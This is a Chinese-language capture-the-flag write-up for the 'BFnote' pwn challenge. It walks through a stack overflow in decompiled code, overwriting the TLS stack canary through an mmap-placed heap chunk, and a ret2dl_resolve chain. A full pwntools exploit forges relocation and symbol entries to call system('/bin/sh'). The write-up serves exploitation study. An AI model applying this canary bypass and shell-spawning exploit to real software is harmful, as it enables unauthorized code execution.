# 新春战“疫” BFnote

### 0x0 前置补偿

[有关ret2dl_resolve的学习笔记](https://github.com/Meng-YC/markdown/blob/master/ret2dl_resolve%E7%AC%94%E8%AE%B0/ret2dl_resolve%20%E5%AD%A6%E4%B9%A0.md](https://github.com/Meng-YC/markdown/blob/master/ret2dl_resolve笔记/ret2dl_resolve 学习.md))

[TLS CANARY](https://wiki.x10sec.org/pwn/mitigation/Canary/#1canary)

### 0x1 分析

看一下安全性：

```c
[*] './BFnote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found				//有CANARY
    NX:       NX enabled				
    PIE:      No PIE (0x8048000)	//地址固定
```

看一下`main()`函数吧：逻辑不复杂。

`main()`

```c
unsigned int __cdecl main()
{
  int i; // [esp+4h] [ebp-54h]
  int notebook_size; // [esp+8h] [ebp-50h]
  char *notebook; // [esp+Ch] [ebp-4Ch]
  int v4; // [esp+14h] [ebp-44h]
  char s; // [esp+1Ah] [ebp-3Eh]
  unsigned int v6; // [esp+4Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  Welcome();
  fwrite("\nGive your description : ", 1u, 0x19u, stdout);
  memset(&s, 0, 0x32u);
  call_read(0, &s, 0x600);                      // 可溢出
  fwrite("Give your postscript : ", 1u, 0x17u, stdout);
  memset(&postscript, 0, 0x64u);
  call_read(0, &postscript, 0x600);
  fwrite("\nGive your notebook size : ", 1u, 0x1Bu, stdout);
  notebook_size = get_int();
  notebook = (char *)malloc(notebook_size);
  memset(notebook, 0, notebook_size);
  fwrite("Give your title size : ", 1u, 0x17u, stdout);
  v4 = get_int();                               // v4 < notbook_size - 0x20
  for ( i = v4; notebook_size - 0x20 < i; i = get_int() )
    fwrite("invalid ! please re-enter :\n", 1u, 0x1Cu, stdout);
  fwrite("\nGive your title : ", 1u, 0x13u, stdout);
  call_read(0, notebook, i);
  fwrite("Give your note : ", 1u, 0x11u, stdout);
  read(0, &notebook[v4 + 0x10], notebook_size - v4 - 0x10);
  fwrite("\nnow , check your notebook :\n", 1u, 0x1Du, stdout);
  fprintf(stdout, "title : %s", notebook);
  fprintf(stdout, "note : %s", &notebook[v4 + 0x10]);
  return __readgsdword(0x14u) ^ v6;
}
```



我们看到`call_read(0, &s, 0x600);  `有明显的栈溢出，但是要解决CANARY的问题。

#### 0x11 CANARY

下面我们可以申请任意大小的堆，而且，我们看到存放CANARY的TLS结构在libc-2.23.so代码段上方。

```assembly
EAX  0x418e4400
------------------------------------------------------
								mov     eax, large gs:14h
► 0x8048778    mov    dword ptr [ebp - 0xc], eax
   0x804877b    xor    eax, eax
   0x804877d    call   0x80486f7
```



```shell
pwndbg> search -p 0x418e4400
                0xf7e0f714 0x418e4400
[stack]         0xffffd5ac 0x418e4400
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /root/pwn/ichunqiu_spring/BFnote/BFnote
 0x8049000  0x804a000 r--p     1000 0      /root/pwn/ichunqiu_spring/BFnote/BFnote
 0x804a000  0x804b000 rw-p     1000 1000   /root/pwn/ichunqiu_spring/BFnote/BFnote
0xf7e0f000 0xf7e10000 rw-p     1000 0
0xf7e10000 0xf7fc0000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fc0000 0xf7fc2000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fc2000 0xf7fc3000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fc3000 0xf7fc6000 rw-p     3000 0
0xf7fd5000 0xf7fd6000 rw-p     1000 0
0xf7fd6000 0xf7fd8000 r--p     2000 0      [vvar]
0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]
0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
```

我们可以用`mmap`申请一个足够大空间，就会在TLS结构的上方。

而且程序的漏洞也支持我们修改任意地址的信息：

`v4 = get_int(); `可以输入指定地址，

然后虽然有溢出检测，但是

`read(0, &notebook[v4 + 0x10], notebook_size - v4 - 0x10);`

读入的时候依然用的之前的值。

```assembly
EAX  0xf7dee008 ◂— 0x0
---------------------------------------------------------
								call    _malloc
►  0x804882f    add    esp, 0x10
   0x8048832    mov    dword ptr [ebp - 0x4c], eax
   0x8048835    mov    eax, dword ptr [ebp - 0x50]
```

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /root/pwn/ichunqiu_spring/BFnote/BFnote
 0x8049000  0x804a000 r--p     1000 0      /root/pwn/ichunqiu_spring/BFnote/BFnote
 0x804a000  0x804b000 rw-p     1000 1000   /root/pwn/ichunqiu_spring/BFnote/BFnote
0xf7dee000 0xf7e10000 rw-p    22000 0
0xf7e10000 0xf7fc0000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fc0000 0xf7fc2000 r--p     2000 1af000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fc2000 0xf7fc3000 rw-p     1000 1b1000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fc3000 0xf7fc6000 rw-p     3000 0
0xf7fd5000 0xf7fd6000 rw-p     1000 0
0xf7fd6000 0xf7fd8000 r--p     2000 0      [vvar]
0xf7fd8000 0xf7fd9000 r-xp     1000 0      [vdso]
0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
pwndbg>
```

可以计算出申请的内存和`TLS->stack_guard`的位置，来覆盖CANARY。

`0xf7e0f714 - 0xf7dee008  = 0x2170c `，还要减去`title`的大小。

#### 0x12 ret2dl_resolve

这个地方主要还是看EXP吧，大致思路就是将伪造的`reloc`、`sym`、`st_name`放到`bss段`上，控制EIP指针指向`bss`就好。

### 0x2 EXP

```python
#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = 'i386'
elf = ELF("./BFnote")
p = process("./BFnote")
libc = ELF('libc.so.6')


def send_description(des):
    p.sendlineafter("Give your description :", des)


def send_postscript(des):
    p.sendlineafter("Give your postscript :", des)


def note_size(size):
    p.sendlineafter("Give your notebook size :", str(size))


def title_size(size):
    p.sendlineafter("Give your title size :", str(size))


def title(t):
    p.sendafter("Give your title : ", t)


def note(n):
    p.sendlineafter("Give your note :", p32(n))


# change canary
bss = 0x804A060
canary = 0xdeadbe00
send_description('a'*0x32 + p32(canary) + p32(0) + p32(bss + 0x300 + 4))
# ret2dl_resolve
plt_0 = 0x8048450
rel_plt = 0x80483d0
index_offset = bss + (0x300 + 0x4 * 4) - rel_plt
dynsym = 0x080481d8
dynstr = 0x080482c8
fake_sym_addr = bss + (0x300 + 0x4 * 4 + 8)
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(0x804a160) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = flat([
    st_name, 0, 0, 0x12
])
payload = flat([
    "s"*0x300,
    plt_0,
    index_offset,
    0xdeadbeef,
    bss + 0x300 + 80,
    fake_reloc,
    'A' * align,
    fake_sym,
    'system\x00'
])
payload = payload.ljust(0x300 + 80, 'A')
payload += '/bin/sh\x00'
send_postscript(payload)
note_size(0x200000)
title_size(0x20170c - 0x10)
p.sendlineafter("invalid ! please re-enter :", str(100))
title("aaaa")
note(canary)
p.interactive()
```

